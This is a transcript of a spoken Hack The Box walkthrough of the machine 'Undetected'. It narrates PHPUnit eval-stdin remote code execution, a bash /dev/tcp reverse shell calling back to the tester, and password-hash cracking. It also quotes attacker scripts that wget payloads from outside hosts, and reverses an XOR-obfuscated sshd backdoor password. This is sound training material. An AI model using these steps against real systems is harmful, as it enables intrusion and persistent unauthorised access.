 what's going on youtube this is ipsec i'm doing undetected from hack the box and i didn't do a lot of prep for this video because the whole premise behind the box is pretty cool and i thought no prep would benefit that the initial shell is pretty standard it's just finding a php directory called phpunit that has a known rce in it to get a shell on the box but once you get a shell that's where this box differs from a lot it's all about like an instant response investigation on this linux box tracking what the attacker did tracing his or reversing his binaries and prevesting via a backdoor that he put in by custom compiling the ssh server daemon he also puts like an apache module in there and does a bunch of other things so um yeah let's just jump in as always we start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it undetected and then the ip address of 1010 11.146. this can take some time to run so i've already ran it looking at the results we have just two ports open the first one is ssh on port 22 and its version just says it's open ssh the next port we have is http on port 80 and its banner is telling us it's apache httpd on ubuntu and now this is weird because most ubuntu machines disclose the version in the ssh banner this machine does not so ssh has definitely been tampered with probably just general security hardening but if they removed the fact that ubuntu is running on ssh i'm surprised whatever security policy they ran didn't apply it also to apache because you can just have apache say this is just apache httpd but um that's a side tangent we may get into that at the end of this video why that's important we have http title is diana's jewelry so let's go take a look at the website so going to 1010 11.146 we get a web page that looks like it is just a general jeweler going through this i don't see anything too unique the main things i'm looking for is like copyright dates that can tell me how old this website is if it was like 2018 2017 i may try some super old vulnerabilities this says 2021 which is actually good um because there's always a chance in these footers that this is generated dynamically maybe it's like a php website and it just grabs the current year and puts that there but it's currently 2022. so we know the website doesn't do that so chances are the last time this website was updated was sometime in 2021 um the next thing i'm going to do is just try like index.php to see if it comes back it does so it's a php thing i try index.html it does it again asd it looks like everything is doing it so i did not confirm it was running php um clicking these links we see it does go to dot html if we click on store um it's going to store.d jewelry.htb so let's go and add this to a host file so sudo vi etsy host 1010 11 146. paste this in get rid of the http and then refresh this page and it's going to the same thing we do have a login form but it says due to a website migration we're currently not taking any online orders if you wish to make a purchase contact us and the link's dead if we click on account and everything else it's going to the same thing so at this point we probably should run a go buster so i'm going to do go buster directory mode dash u um http 101011 146. our word list opt set list discovery web content raft small words dot text and this is actually a php extension um if i just do slash cart is it going to go there it goes to a 404 that's interesting let's do slash asd so this looks like the same site right the store.d jewelry.com but if i go to 1010 11.146 and we go to asd oh maybe i just didn't get enough time earlier but um index.asd yeah i probably didn't give enough time i saw the animation and just assumed um but it is php is it also html no so index.html exists here but not here interesting but um let's just do extension php out file i'm going to call this gobusto.out and just looking at what it shows so there's really nothing of interest yet everything's either 403 or 301 uh this 200 okay is just a period so um nothing interesting i should have ran go buster earlier because then it would be further along that's why you should always have recon going in the background because you can't hack time so it's better just to start these long-running tools up front so by the time you want to look at them it's already ran we do have contact at d jewelry.htb as a potential email address phone number looking at all these links nothing goes anywhere we could like try login.php like login.back.php and try to find like a backup file go buster does have the backup option to automatically find those things as does ferro buster could have ran it with that but i chose not to maybe once we get a output list if we don't find anything that's when i will do it um always kind of just think of things as you click around while things work if i add something to a cart nothing works looking at other promotions this has a page but these page things don't go if i saw like um products.php and page equals one then i try for sql injection there but it doesn't look like that works either um new collection products so nothing really of interest i'm just going to whoa search for 200 so everything like that um stands out we do have a slash server status but that is 403 i'm getting some more anytime we do a dot it looks like maybe we get a 403 or maybe it's only if it begins with like dot ht so if i do asd nothing happens dot ht yeah if it begins with dot ht we're getting forbidden uh dot h is fine and that's probably just a way to forbid access to like dot ht access dot ht passwd dot whatever else there is that may be sensitive um instead of doing like a blacklist of every file you know about sometimes it's better to just do a blacklist of the first few characters that way there's files that you don't know about also get hit with this blacklist looking up i don't see anything else again just going down this list we may have wanted to run this without the php extension because this doubles the time it takes if we weren't running it with the php extension we'd be at 50 right now um [Music] let's see is there anything else he possibly could have missed if not then i'm just going to pause the video and wait for that to finish we could like download these images look at the metadata it is in slash images and this is a open directory if we go to the parent directory it just goes to the site but we can look through these images see if anything stands out most the images are from 2014 here's some 2019's but it looks like it's just stock photos video image don't know where that is on the site but i was looking for like some weird image that stood out that could be like a password or something gp this is google plus social media so nothing of interest there so i'm just gonna let this go bust to finish and we'll see what happens when it's done okay so go buster has finished but we don't really see all that much i did have that out file and this is the main reason why i use it because i can just do grep v and then search for like four or three i do a space just to make sure the string starts with four or three i could also add this parenthesis and the reason why i do that is in case the size was like 24038 i'm not excluding that line right and when we do that we don't see anything so let's go take a look back at this we did have stored.d jewelry.htb and this and while they look the same they aren't they're slightly different we have the header here this is new collection necklace earrings that's the same a lot of is the same we just pretty much have this header and does the footer exist on the bottom it does so really the only thing that changes is this header so uh we also know that some of the like functionality changed right such as um like index dot asd things like that but let's go back to a go buster and we're going to replace with the host file and i'm gonna take off the extension just so it goes a bit faster and i think i can do a dash t i forget what the default threads is do we have it here uh let's see threads it's at 10 i'm going to change it to 50 and we'll call this go buster we'll do dot store.out and see how long this takes um and again like this is why i like starting my go busters early um we do have a slash vendor so let's go take a look at what that is that is non-default and we have it's running php composer we have like this bin directory that is empty composer i was just looking for like a config install.json is saying all the um libraries that are installed i believe so we have like deep copy things like that that may be helpful if we're looking for some type of old library that's vulnerable such as maybe like image tragic things like that but i'm not going deep into that because we don't have any like upload i don't even know how to send this user input other than a website or um a url right it's not really accepting anything so um that's why i'm not going deep down into that uh we do have php unit and i know php unit is actually um exploitable if i google php unit exploit and go to google we have an rce and it's got a bunch of files like eval dash standard n so let's see if this exists so if we do vendor php unit php unit source util we have this here um what if i can do it in a get real quick echo hi is that going to work probably not it's easiest to do this type of stuff in a post request so let's send it over to burp suite intercept on refresh let's send it to the repeater tab first and all i'm doing is following what this said and if we look at it i think it just puts it in the post request right um i know it's saying eval standard in php so um it's taking standard in and passing it to eval which executes php code so php echo hi maybe i didn't put in quotes and aired out and that's why so that works i'm going to try this on the standard web server just like as a here nope didn't work oh well but we have it executing code if it said like the whole php string we wouldn't have it executing um we could probably do one plus one to actually confirm does that work maybe not there's probably a special way we have to do that math and i don't know it in php but at this point we can run like system commands so system who am i uh let's see php system id where am i screwing up s-y-s-t-e-m oh i don't have a uh question mark so then we can just do bash dash i um what is it and this dev tcp 10 10 14 8 0 like that i want to say for some reason i'm blanking on the reverse cell syntax nc ovnp 9001 that's not working let's do a c [Music] and then put it there took longer run but we did not get it is my syntax wrong it looks like i have the wrong syntax so devtcp zero at bash reverse shell one line even the simple things sometimes people forget them let's do bash dash i so bash dash i then bracket that dev tcp zero so i reversed my ant sign on both things there we go that hung and here we go the reverse shell comes so if you ever get like this error make sure your um ampersands are in the correct spot so let's get a real shell so python c import pty pty dot spawn ben dash like that stty raw minus echo fg enter enter and we are now have a shell on this box um i'm going to export term is equal to x term and then this line wrapping thing is annoying as you see it's not just going to the next line so what i'm going to do is stty dash a we're 26 rows 105 columns so stty rows 26 columns 105 and now our line does not wrap 26 columns 105. export term is equal to x term maybe i didn't do it in capital um we see i did term in lowercase so i swapped the casing apparently today is a case of me reversing everything i'm not sure exactly why but there we go oh let's see so we're dub dub dub data on this box um one thing i always like doing is going to the home directory which of course we're going to be here we can find dot grep config and see if we have anything we don't we can do ssl ntp and here i was looking to see if like 3306 was listening because that would indicate like my sequel if there was a database then we could actually go in the configuration but there's no database listening here so um i don't have to go look for a config file it should be worth mentioning like in an actual environment you would not only look at ss lntp but just ntp or um maybe ant to look at all the connections because the my sequel server may be listening on a remote host so no database here what else can we do we can find all the files owned by dub dub dub data so we can do find uh [Music] and let's see i'm going to grep dash v we don't care about slash proc uh slash run uh var dub dub dub we already know so is there anything else did i see vera dub dub dub there what am i getting that's weird proc oh there's no space there we go so we can see a few things we have slash temp slash files um dev pts zero uh ver cache and verb backups info backups is always interesting so if i go to backups we have that info i'm going to do a ls-la on info we see it's only executable by dub dub dub data and it was put on the box may 14th if i do a stat on it we could see other things nothing really too interesting about it but we should go see exactly what this is if we try to execute it we see it is potentially a kernel exploit um we see kaslr bypass which is kernel aslr and then substring fff not found in d message so this looks like an old exploit so let's copy it back over to our box how big is this uh that's a decent size so can we i'm gonna be lazy and we can copy info into var dub dub dub html uh what ver dub dub dub uh let's do main so cp info there and now if i w get 10 10 11 146 slash info we download it to a box and then we can do analysis on it like run strings and we see the kernel um bin bash and then doing a bunch of hexy stuff i'm guessing this is all just hex so i'm going to copy this we can go to cyber chef to see what it is so cyber chef gchq input from hex and we have it pretty much being a bash script so let's do v [Music] info.sh i'll call it and we see it's doing a w wget temp files xyz authorized keys on root then it's going to download.main and var lib.main sagemodit echo something to the cron tab then it looks like it's echoing a line to pass wd um i'm not going to pretend to make sense of all this weird aux syntax but we see system echo um dollar one so this is probably the first parameter this is something but here's a password string to etsy passwd and then echoing something to users.txt which we can't see uh home shell doing something with user.txt so let's go and crack this password to see if we can it is probably going to take a little while because it is a sha 512 encrypted password which is relatively annoying but we can take a look at real quick pass it with no um what was it going to say no rule files because it cracks slow strings info why did that not find it um because it had a quote or something that's annoying less oh it's a dot sh what did i put it was it in this one i did not save it that's why okay so we can copy this and we could also if we want to make sure we escape it correctly if i just run this system command it will probably work so it's running system echo so copy this and php dash a if we echo this that didn't work let's just copy and paste and remove that one escape there we go ssh over to the kraken go into hash cat v hashes i'm going to call this undetected paste this in get rid of that escape character get rid of this escape character and i think we are good so dot slash hash cat hashes undetected upped wordless rocky.text and see how long this takes um hopefully it doesn't take too long but i am not positive maybe i should have added that dash o to my command line to optimize it but it is initializing the runtimes and already cracked so if we do show get rid of the word list we can see the password is i hate hackers so if we copy this and try an su with that password doesn't work let's cat at z pass wd grep for everything that ends in sh uh there's steven and steven one so let's do su-steven put in that password steven1 put in the password and we get access so there is user.txt there is no history file if we go dot ssh nothing there we can do a find slash dash user i'm going to grip this passwd again etsy pass wd grab steven so i was a bit confused because my id just says steven but we can see the user id and gid of steven is identical right so this is probably um some hacker had got in and added a user and just mimicked him to be steven so we didn't change steven's password we just created a new account steven duplicated his user id and gid and became him so we can access everything he is doing we do a pseudo-l put in the password um type the password because it's off my clipboard apparently so i hate hackers um [Music] maybe the pseudo is actually pulling it from the regular steven let's see paste okay that's in my clipboard so i'm guessing it's pulling it from the first even and not this one so we don't have his password but from this point we're assuming it is going to be some type of um is it response type case right we could do the find slash dash user steven to dev null and then grep dash v slash proc um slash run slash cis see what's here we have a verb male steven if we look at it um just an email not really saying anything too important so we should do some type of instant response on this system now and if you've watched a lot of my videos you know the first thing i generally do on linux machines when it comes to ir is investigate timestamps because you can see at first the timestamps just go down to the day right but if we look at them how they exist on the disk using like the stat command we can see they go down to a much granular than a second it's a 32-bit timestamp and this becomes important because there's a lot of things like if we go into slash bin let's just cd there and then run stat on one of these we can see the modification date has these zeros right and this is important to us because the file system of the package manager drops them on this and it's in a compressed format and that compressed format doesn't store the full 32-bit timestamp it just stores up to the second so if someone created a file into this directory manually the modification date would have um a more granular timestamp so if we do finds we can do it on the current directory dash type f dash printf and then percent t to show the full timestamp and then add dash percent p to show the file name or pn i think it is and then backslash n to do a line break and now we can just grep dash v for all these zeros i like just doing four zeros in a row and we see nothing in this directory has been edited by a user at least if it has um the attacker didn't go back and manually fix the time stamps right so let's go to just do this on slash and then we need to add a to dev null and we're gonna see this is very noisy we have a lot of files right because there's like directories like um slash proc slash run what's another one slash sys all python files when you run them create a pyc file so that's no interest to us when we do this um and enter now etsy directory isn't going to be that interesting so we could also hide that and let's see grub this whole boot directory we can hide that we're still getting a lot of python i'm just going to hide python and then of course ver log is always going to be written too so we can hide that i swear i saw python here maybe not so running this again what do we have well this home steven that's not interesting var lib we should just hide that see there we go so if our backups we saw there's this var cache var dub dub dub that's the website i guess i screwed up typing python because python is still here oh we don't put a space there we go for cash dub dub dub user share so there's nothing here um another good thing with time stamps is looking for things that just have the date set because every now and then like attackers like going back and modifying it and when they type a timestamp they generally just type it up to the day um and if they do that then everything else is going to be blank right so let's search for hour zero minute zero second zero and we should hide um let's see grab v we want to do sis slash proc slash run and we just get one file this user s bin sshd which is suspicious if i do a lsla on it um i don't want to do pn i just want to do percent p there we go um everything was ending in n because i had that n there user error but um so p is path so that's why it's percent p so this user bin sshd if we do a du-hs on it we can see it's 3.5 megs and du-hs on user s-pen shd it's 868k so there's definitely something interesting in this binary if i run our strings against it oh we can't so let's just copy um let's see cpshd uh cp user s been shd var www.main and i can't because i'm not dub dub dub data so let's just get another shell do this cp user aspen sshd to www.main and now we can wget 101011 146. i think that's the ip slash shd yep it is downloading so for this one running strings may not be good because it's so big and it may be hard to find it but let's look at it anyways there's a lot of functions here let's see i'm going to do strings grab for system see if there's anything here uh let's see base64 i'm not sure let's just open this up in ghidra to see if there's anything that helps us with this so loading it up close uh file new project care about the name click the dragon icon then hit i to import it then we can go [Music] htb what is it undetected sshd okay has not been analyzed let's analyze it now and i'm going to pause the video wait for all these things to um finish working okay so everything's done and we don't have really a lot to go off of if we look at the exports we can see this is not a stripped binary because we have all the functions and everything um there is one thing we could do that isn't going to be realistic so we won't go down this path far enough but if we looked at strings and gripped like back we see like backdoor active backdirty.h so we could find all these functions kind of look at the cross references um if we go to the sit like the exports i actually had it stopped on it but we see like bacter active and then we look we can see all the functions that it's in so we could kind of trace it back or look at backdoor.h and see everything it kind of touches but this isn't really how you'd do something like this in real life because number one the binary will be stripped and it also won't have these nice things like backdoor.h so you go in functions like auth password and kind of look at its routine right and we can see because it's not stripped we have all the variable names right here but i can see it's saying a backdoor thing and doing an xor right so this is probably how you'd find it just looking at all the legitimate functionality of it and kind of tracing it and looking for weird things now this is kind of odd how it's set because we see backdoor then 24 4 and then um four bytes of hex are made bits of hex i always get bits and bytes confused but 16 and then eight and this is double the length of this so um that's handy i guess and this 16 24 0 4 8 we have 28 2 here so this is indicating the position and then this is indicating the length this one is only one and it doesn't have a length oddly enough it is i believe signed right now we see this one being negative if we right click it we can see the real value is a five but what we want to do is get this into a variable kind of reassemble it and then what it does is a xor of the character 96 against it and then compares the password if it matches it lets you in so let's try that um i'm going to go to cyber chef so gchq again uh we have it right here so we can i guess leave the from hex because we're still dealing hex so i'm going to copy each of these values so copy this then we can copy this 8 is next then the next one will be this so 12 16. i don't know if we're gonna have to eventually break this one up um let's see 24. then this and finally this one a5 okay so we can see the output um doesn't really work but we can xor it right and we know the xor value was 96 the xor symbol is this um x power care whatever you want to call it so 0x96 and now it's just plain text so we can try logging in with this so ssh root at 10 10 11 146. and it doesn't work now this could be an ndns problem like maybe this string did not start with f0 it's actually d6 and cyber shaft makes it easy for us we can just swap ndns leave that there at four bytes and see what happens here so we ssh and it still doesn't work and i'm guessing it's probably related to this because it's reading it four bytes at a time and then probably going to pad this one if we undo this to undo the padding does it work this way it does not let's move this a5 to here and see if this one works oh i think i've been pasting oh i copied that i don't know how that happened there we go paste this still didn't work let's try a5 here copy paste and that's not letting us in so it could also be with this big string so let's try putting this one here and there we go we get in so um we got root.text right there so what was happening is because we specified like four bytes in length i think i think we just wanted each of these to be four and when we didn't do the padding like the whole ndns swap just got weird because this one only had two this one had one on the thing so that's why we're trying to move it up to make it as i guess symmetrical as possible we can't add a zero there yeah um if we added a null byte then it just adds it to the end which is string termination but um i actually don't think this is a null byte then because we know it out it's probably just a non-ascii printable character but yeah that is pretty much the box um we did skip one whole step because um if we paid attention to the email as steven uh we can go back and do that step real quick um let's see cat versus bull male stephen because they talk about weird behavior with the apache service this was actually a hint to go into the apache config and if we look at mods enabled and look at these one of these is odd i want to say reader.load reader isn't a normal apache module maybe the time stamps would have helped with this so if we go mods available is this one completely different everything's 20 20. let's see grep reader we see reader is 20 21 so if we do lsla grep v2020 we would see the mod reader module was added relatively recently and this is another back door that points people to the other one so um i'm going to copy this one so let's do cd etsy apache 2 mods available and then we can copy mod reader.oh to for dub dub dub main okay and wget 1010 11 146 mod reader.l if i strings this file do we get anything interesting um not sure this looks like it could be a base64 string this alphabet's definitely indicating there is base64 there generally when you see like a whole alphabetic string that's what it means um we have to fix that base64-d and yeah we can reverse it this way as well um i'm going to put a blank line first so we can see it's doing a w get i'm downloading image.jpg saving it as sshd and then doing this touch command and this is how we actually found it because it does a touch and then grabs the date of apache tool enable mode mod and then sets that date on user aspen sshd but because the date string they grabbed ends at the um actual like date or a day doesn't go into the minutes seconds whatever that's why it started out of being all zeros because they just did a bad clone timestamp of something so um it's actually funny that we found the file because of bad time stomping and not um tracing the full path of it if we wanted to we could have opened this file in guidra as well so i could close out of this all these um you could reverse as well with ghidra but um as john hammond says strings is overpowered like you'd be surprised at what you can find in strings and a little bit of guessing right like we just saw something that looked like base64 try decoding it and done right um if we do the exports we can see base64 decode what is read a module why didn't this decompile um i'm going to try it again shouldn't be talking while i do some things and let's see open mod reader.o elf that looks fine yes to analyze analyze everything okay exports read a module why isn't this decompiling okay um decode block base64 decode that's how it's doing it let's see this is module moderator.c entry point i've never really well i guess i have opened um modules in ghidra but it's been a while see can we find what is the cross reference here so we can see it's called by these functions order you base64 decode see if we go to namespaces nope classes nope looks like base64 makes this a lot easier because we've got d code block i don't think this is it though um we gotta guess find what d code block is called by um entry point b64 decode what is this string so at this point i'm guessing guidra just completely failed me maybe i should update it but i'm going to switch to a different d compiler and we're gonna see what that does um let's see i think i have cutter installed right is it just that yeah so um i downloaded this let's see i'm sure if you go to ipsec dot rocks i'll have a thing but i just downloaded from cutter.re uh we could probably try downloading it again because i don't know what version i had uploaded and download failed why do you fail this is like not going well uh do i just not like have space on my machine or let's see copy link w get nurse based left df lh let's see hdb d-u-s-h-s oh do we have anything that's a gig um you can delete that download completed awesome so cd downloads i'm going to close this one because i have no idea what version that is um let's see we should make this executable 205 that is not it oh god i have a lot of these [Music] two one zero v two 1 0 there we go so now we can select the file and we're going to go up a directory htb undetected and then mod reader let's see what this does and this is always the issue when i do things live every now and then things just really don't make sense [Music] see we're just getting the base64 decode see decode block i'm looking for the big base64 string here we go so this sim hook post config so this looks better um it's hooking probably um apache after the configuration and then we see it passing this big base64 string to b64 d code and then doing an exec right so it's doing bin bash against this string and we've already um decoded it so we could do it again but echo dash n base64-d right so we saw this so let's go back to ghidra and i closed it out but i just want to see if i can find it real quick gija gaijo run and then open up my reader then we can reopen this file mod reader um let's give it a different name so we can re-analyze it i want to make sure that one function did not exist i don't see a post config if we go here um ap hook post config it's got a bunch of question marks here so it did not fully handle that ah here it is hooks first config so if we found it in the actual function hook post config we can see um guidra decompiling it and one of the main differences between giger's decompiler and cutters which uses r2 is it tells you the um registers here but guidra just kind of does that in arguments and tries to make it i guess different like readable that way we could change the decompiler mode if we do it in gija um it tries giving it kind of a giga-like syntax but it doesn't really hit the mark um i always like this one better but both tools do find it as long as you know how to use them um apparently i don't so hope you guys enjoyed the video take care and i'll see you all next week